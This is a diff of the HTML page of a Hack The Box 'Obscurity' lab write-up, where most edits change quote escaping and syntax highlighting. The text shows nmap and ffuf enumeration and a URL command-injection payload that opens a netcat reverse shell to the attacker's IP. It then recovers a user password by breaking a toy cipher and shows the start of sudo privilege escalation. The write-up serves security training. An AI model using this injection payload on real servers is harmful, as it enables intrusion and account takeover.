@@ -107,7 +107,7 @@ Hack The Box - Obscurity :: Ceso Adventures
 <p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
 <h2 id=nmap>Nmap</h2>
 <p>We start with nmap to see which ports are there open:</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb 
 Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
 Nmap scan report for 10.10.10.168
 Host is up (0.084s latency).
@@ -130,27 +130,27 @@ PORT     STATE  SERVICE    VERSION
 |     Content-Type: text/html
 |     Connection: Closed
 |     &lt;!DOCTYPE html&gt;
-|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;html lang=&#34;en&#34;&gt;
 |     &lt;head&gt;
-|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta charset=&#34;utf-8&#34;&gt;
 |     &lt;title&gt;0bscura&lt;/title&gt;
-|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
-|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
-|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
-|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=Edge&#34;&gt;
+|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+|     &lt;meta name=&#34;keywords&#34; content=&#34;&#34;&gt;
+|     &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
 |     &lt;!-- 
 |     Easy Profile Template
 |     http://www.templatemo.com/tm-467-easy-profile
 |     &lt;!-- stylesheet css --&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/bootstrap.min.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/font-awesome.min.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/templatemo-blue.css&#34;&gt;
 |     &lt;/head&gt;
-|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
+|     &lt;body data-spy=&#34;scroll&#34; data-target=&#34;.navbar-collapse&#34;&gt;
 |     &lt;!-- preloader section --&gt;
 |     &lt;!--
-|     &lt;div class=&quot;preloader&quot;&gt;
-|     &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
+|     &lt;div class=&#34;preloader&#34;&gt;
+|     &lt;div class=&#34;sk-spinner sk-spinner-wordpress&#34;&gt;
 |   HTTPOptions: 
 |     HTTP/1.1 200 OK
 |     Date: Tue, 17 Dec 2019 21:42:23
@@ -160,72 +160,72 @@ PORT     STATE  SERVICE    VERSION
 |     Content-Type: text/html
 |     Connection: Closed
 |     &lt;!DOCTYPE html&gt;
-|     &lt;html lang=&quot;en&quot;&gt;
+|     &lt;html lang=&#34;en&#34;&gt;
 |     &lt;head&gt;
-|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta charset=&#34;utf-8&#34;&gt;
 |     &lt;title&gt;0bscura&lt;/title&gt;
-|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
-|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
-|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
-|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
+|     &lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=Edge&#34;&gt;
+|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
+|     &lt;meta name=&#34;keywords&#34; content=&#34;&#34;&gt;
+|     &lt;meta name=&#34;description&#34; content=&#34;&#34;&gt;
 |     &lt;!-- 
 |     Easy Profile Template
 |     http://www.templatemo.com/tm-467-easy-profile
 |     &lt;!-- stylesheet css --&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
-|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/bootstrap.min.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/font-awesome.min.css&#34;&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;css/templatemo-blue.css&#34;&gt;
 |     &lt;/head&gt;
-|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
+|     &lt;body data-spy=&#34;scroll&#34; data-target=&#34;.navbar-collapse&#34;&gt;
 |     &lt;!-- preloader section --&gt;
 |     &lt;!--
-|     &lt;div class=&quot;preloader&quot;&gt;
-|_    &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
+|     &lt;div class=&#34;preloader&#34;&gt;
+|_    &lt;div class=&#34;sk-spinner sk-spinner-wordpress&#34;&gt;
 |_http-server-header: BadHTTPServer
 |_http-title: 0bscura
 9000/tcp closed cslistener
 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
 SF-Port8080-TCP:V=7.80%I=7%D=12/17%Time=5DF94BCA%P=x86_64-pc-linux-gnu%r(G
-SF:etRequest,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
+SF:etRequest,10FC,&#34;HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
 SF:019\x2021:42:22\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2017
 SF:\x20Dec\x202019\x2021:42:22\nContent-Length:\x204171\nContent-Type:\x20
 SF:text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\
-SF:&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;
-SF:\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&gt;\n\t
-SF:&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-
-SF:scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;\&quot;&gt;\n\t&lt;meta\x20n
-SF:ame=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Temp
+SF:&#34;en\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;
+SF:\n\t&lt;meta\x20http-equiv=\&#34;X-UA-Compatible\&#34;\x20content=\&#34;IE=Edge\&#34;&gt;\n\t
+SF:&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=device-width,\x20initial-
+SF:scale=1\&#34;&gt;\n\t&lt;meta\x20name=\&#34;keywords\&#34;\x20content=\&#34;\&#34;&gt;\n\t&lt;meta\x20n
+SF:ame=\&#34;description\&#34;\x20content=\&#34;\&#34;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Temp
 SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20s
-SF:tylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bo
-SF:otstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/font-
-SF:awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/templ
-SF:atemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;scroll\&quot;\x20data-targe
-SF:t=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n
-SF:&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;sk-spinner\x20sk-spinne
-SF:r-wordpress\&quot;&gt;\n&quot;)%r(HTTPOptions,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x2
+SF:tylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/bo
+SF:otstrap\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/font-
+SF:awesome\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/templ
+SF:atemo-blue\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&#34;scroll\&#34;\x20data-targe
+SF:t=\&#34;\.navbar-collapse\&#34;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n
+SF:&lt;div\x20class=\&#34;preloader\&#34;&gt;\n\t&lt;div\x20class=\&#34;sk-spinner\x20sk-spinne
+SF:r-wordpress\&#34;&gt;\n&#34;)%r(HTTPOptions,10FC,&#34;HTTP/1\.1\x20200\x20OK\nDate:\x2
 SF:0Tue,\x2017\x20Dec\x202019\x2021:42:23\nServer:\x20BadHTTPServer\nLast-
 SF:Modified:\x20Tue,\x2017\x20Dec\x202019\x2021:42:23\nContent-Length:\x20
 SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x2
-SF:0html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\
-SF:t&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20c
-SF:ontent=\&quot;IE=Edge\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=de
-SF:vice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20cont
-SF:ent=\&quot;\&quot;&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\n
+SF:0html&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\
+SF:t&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&#34;X-UA-Compatible\&#34;\x20c
+SF:ontent=\&#34;IE=Edge\&#34;&gt;\n\t&lt;meta\x20name=\&#34;viewport\&#34;\x20content=\&#34;width=de
+SF:vice-width,\x20initial-scale=1\&#34;&gt;\n\t&lt;meta\x20name=\&#34;keywords\&#34;\x20cont
+SF:ent=\&#34;\&#34;&gt;\n\t&lt;meta\x20name=\&#34;description\&#34;\x20content=\&#34;\&#34;&gt;\n&lt;!--\x20\n
 SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
-SF:ofile\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;styles
-SF:heet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
-SF:t\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
-SF:t\&quot;\x20href=\&quot;css/templatemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\
-SF:&quot;scroll\&quot;\x20data-target=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x2
-SF:0section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;
-SF:sk-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);
+SF:ofile\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&#34;styles
+SF:heet\&#34;\x20href=\&#34;css/bootstrap\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;styleshee
+SF:t\&#34;\x20href=\&#34;css/font-awesome\.min\.css\&#34;&gt;\n\t&lt;link\x20rel=\&#34;styleshee
+SF:t\&#34;\x20href=\&#34;css/templatemo-blue\.css\&#34;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\
+SF:&#34;scroll\&#34;\x20data-target=\&#34;\.navbar-collapse\&#34;&gt;\n\n&lt;!--\x20preloader\x2
+SF:0section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&#34;preloader\&#34;&gt;\n\t&lt;div\x20class=\&#34;
+SF:sk-spinner\x20sk-spinner-wordpress\&#34;&gt;\n&#34;);
 Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%)
 No exact OS matches for host (test conditions non-ideal).
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
-</code></pre><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p>
+</code></pre></div><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p>
 <h2 id=web-enumeration>Web enumeration</h2>
 <p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
 There are some sections in the page talking about the service by obscurity and providing information on another &ldquo;products&rdquo; that are built by &ldquo;the company&rdquo; as well some contact information.</p>
@@ -239,19 +239,19 @@ There are some sections in the page talking about the service by obscurity and p
 <p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
 I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href=https://github.com/ffuf/ffuf>you can get ffuf here</a>.</p>
 <p>Then I proceed to fuzze the server and I got some interesting results:</p>
-<pre tabindex=0><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
-
-        /'___\  /'___\           /'___\       
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>        /&#39;___\  /&#39;___\           /&#39;___\       
        /\ \__/ /\ \__/  __  __  /\ \__/       
        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
          \ \_\   \ \_\  \ \____/  \ \_\       
           \/_/    \/_/   \/___/    \/_/       
-
-       v0.12
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>       v0.12
 ________________________________________________
-
- :: Method           : GET
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span> :: Method           : GET
  :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
  :: Output file      : obscurity-ffuf.htb
  :: File format      : json
@@ -261,11 +261,11 @@ ________________________________________________
  :: Threads          : 40
  :: Matcher          : Response status: 200
 ________________________________________________
-
---- SNIP ---
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>--- SNIP ---
 develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
 :: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
-</code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
+</code></pre></div><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> threading
 <span style=color:#f92672>from</span> datetime <span style=color:#f92672>import</span> datetime
 <span style=color:#f92672>import</span> sys
@@ -439,12 +439,12 @@ MIMES <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;txt&#34
 <p>Pst: The hyperlink against the doc of <code>exec</code> points to 2.0 because when I did this machine, python 2.x was still alive, and then I just went to read of exec on that version.</p>
 <h2 id=rce>RCE</h2>
 <p>Knowing that the webserver is vulnerable to a command injection, I started to do some trial/error in differents ways, after some time and a little POC I ended getting a reverse shell by executing:</p>
-<pre tabindex=0><code class=language-console data-lang=console>http://10.10.10.168:8080/';os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f');'
-</code></pre>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>http://10.10.10.168:8080/&#39;;os.system(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.16 4444 &gt;/tmp/f&#39;);&#39;
+</code></pre></div>
 <img src=https://ceso.github.io/images/htb/obscurity/1-rce.png class=center style=border-radius:8px>
 <h2 id=user>user</h2>
 <p>Once inside a reverse, I start doing some normal linux enumeration, after a few minutes I see there is a user called <code>robert</code> and I list the contents of it&rsquo;s home:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ ls -la /home/robert
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ ls -la /home/robert
 total 60
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 .
 drwxr-xr-x 3 root   root   4096 Sep 24 22:09 ..
@@ -462,22 +462,22 @@ drwxrwxr-x 3 robert robert 4096 Oct  3 16:34 .local
 -rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
 -rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py
 -rwx------ 1 robert robert   33 Sep 25 14:12 user.txt
-</code></pre><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&mldr;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
+</code></pre></div><p>So, we need to compromise <code>robert</code> and in it&rsquo;s home lies the path&mldr;in the ls is possible to see some interesting files/directorys: <code>BetterSSH</code>, <code>SuperSecureCrypt.py</code>, <code>out.txt</code>, <code>check.txt</code> and <code>passwordreminder.txt</code>, we start by checking the content of everything:</p>
 <p>First, the directory BetterSSH looks interesting, but we can&rsquo;t see what&rsquo;s inside, so let&rsquo;s take note of this as might come handy later.</p>
 <p><code>check.txt</code> has an interesting message:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat check.txt
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat check.txt
 Encrypting this file with your key should result in out.txt, make sure your key is correct! 
-</code></pre><p><code>out.txt</code> looks like a ciphered message&mldr;(and from the content of <code>check.txt</code> we know they are related)</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file out.txt
+</code></pre></div><p><code>out.txt</code> looks like a ciphered message&mldr;(and from the content of <code>check.txt</code> we know they are related)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file out.txt
 out.txt: UTF-8 Unicode text, with NEL line terminators
 www-data@obscure:/home/robert$ cat out.txt
 ¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
-</code></pre><p>Same with <code>passwordreminder.txt</code>:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file passwordreminder.txt
+</code></pre></div><p>Same with <code>passwordreminder.txt</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ file passwordreminder.txt
 passwordreminder.txt: UTF-8 Unicode text, with no line terminators
 www-data@obscure:/home/robert$ cat passwordreminder.txt 
 ´ÑÈÌÉàÙÁÑé¯·¿k
-</code></pre><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
+</code></pre></div><p>And finally, the code of <code>SuperSecureCrypt.py</code>:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
 <span style=color:#f92672>import</span> argparse
 
@@ -566,27 +566,27 @@ print(banner)
             f<span style=color:#f92672>.</span>write(encrypted)
 </code></pre></div><p>By analyzing what the code does, one can see that it takes a file as input and a key and ciphers that file, is possible to observe as well we can provide a ciphered file and it&rsquo;s correspondant plain text file in decrypt mode as key, which will give back the key that was used&mldr;
 Then we proceed to execute the script with <code>out.txt</code> as input and <code>check.txt</code> as the key, saving the output (the key), under tmp as <code>foobar</code>:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &quot;$( cat check.txt )&quot; -o /tmp/foobar -d
-################################
-#           BEGINNING          #
-#    SUPER SECURE ENCRYPTOR    #
-################################
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i out.txt -k &#34;$( cat check.txt )&#34; -o /tmp/foobar -d
+#<span style=color:#75715e>###############################</span>
+#           BEGINNING          <span style=color:#75715e>#</span>
+#    SUPER SECURE ENCRYPTOR    <span style=color:#75715e>#</span>
+#<span style=color:#75715e>###############################</span>
   ############################
   #        FILE MODE         #
   ############################
 Opening file out.txt...
 Decrypting...
 Writing to /tmp/foobar...
-
-www-data@obscure:/home/robert$ cat /tmp/foobar    
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>www-data@obscure:/home/robert$ cat /tmp/foobar    
 cat /tmp/foobar
 alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
-</code></pre><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k 'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai' -o /tmp/pass -d
-################################
-#           BEGINNING          #
-#    SUPER SECURE ENCRYPTOR    #
-################################
+</code></pre></div><p>Now, we are able to decipher <code>passwordreminder.txt</code> providing the key we got before, getting then the content of <code>passwordreminder.txt</code> and highly likely the password of the user itself:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -i passwordreminder.txt -k &#39;alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai&#39; -o /tmp/pass -d
+#<span style=color:#75715e>###############################</span>
+#           BEGINNING          <span style=color:#75715e>#</span>
+#    SUPER SECURE ENCRYPTOR    <span style=color:#75715e>#</span>
+#<span style=color:#75715e>###############################</span>
   ############################
   #        FILE MODE         #
   ############################
@@ -596,23 +596,23 @@ Writing to /tmp/pass...
 www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
-</code></pre><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
-<pre tabindex=0><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat /tmp/pass
+</code></pre></div><p>Now we try to do <code>su - robert</code> with the retrived password, and we are <code>robert</code> :)</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>www-data@obscure:/home/robert$ cat /tmp/pass
 cat /tmp/pass
 SecThruObsFTW
 www-data@obscure:/home/robert$ su - robert
 su - robert
 Password: SecThruObsFTW
-
-robert@obscure:~$
-</code></pre><h2 id=root>root</h2>
+<span style=color:#960050;background-color:#1e0010>
+</span><span style=color:#960050;background-color:#1e0010></span>robert@obscure:~$
+</code></pre></div><h2 id=root>root</h2>
 <p>From here on, is recommended to connect as robert via ssh with the password we got before as we will have a fully TTY. Once in, as we are <code>robert</code>, it&rsquo;s possible for us to see what&rsquo;s inside <code>BetterSSH</code>:</p>
-<pre tabindex=0><code class=language-console data-lang=console>$ ls -la BetterSSH
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>$ ls -la BetterSSH
 total 12
 drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
 drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
 -rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
-</code></pre><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
+</code></pre></div><p>There is a script called <code>BetterSSH.py</code>, we check it&rsquo;s code which is:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> sys
 <span style=color:#f92672>import</span> random<span style=color:#f92672>,</span> string
 <span style=color:#f92672>import</span> os
@@ -678,28 +678,28 @@ session <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;user&
         print(<span style=color:#e6db74>&#39;Output: &#39;</span> <span style=color:#f92672>+</span> o<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>))
         print(<span style=color:#e6db74>&#39;Error: &#39;</span>  <span style=color:#f92672>+</span> e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#66d9ef>if</span> len(e<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;ascii&#39;</span>)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#66d9ef>else</span> print(<span style=color:#e6db74>&#39;&#39;</span>)
 </code></pre></div><p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:</p>
-<pre tabindex=0><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo -l
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console>robert@obscure:~/BetterSSH$ sudo -l
 Matching Defaults entries for robert on obscure:
